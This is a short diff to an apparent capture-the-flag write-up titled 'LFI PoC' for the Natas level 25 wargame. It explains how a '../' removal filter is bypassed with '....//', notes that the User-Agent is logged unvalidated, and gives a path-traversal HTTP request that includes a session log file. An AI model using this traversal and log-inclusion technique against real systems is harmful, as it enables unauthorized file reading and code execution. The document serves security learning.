@@ -1,5 +1,16 @@
 # LFI PoC
 
+## Description
+1. The ```str_replace()``` filter is easily bypassed:
+
+Example:
+```php
+php -r 'print(str_replace("../", "", "....//") . "\n");'
+```
+
+2. The log function includes the User-Agent without any validation.
+
+## Request
 ```
 GET /?lang=....//logs/natas25_kiuh65auel8ahc3u7md3rujio4.log HTTP/1.1
 Host: natas25
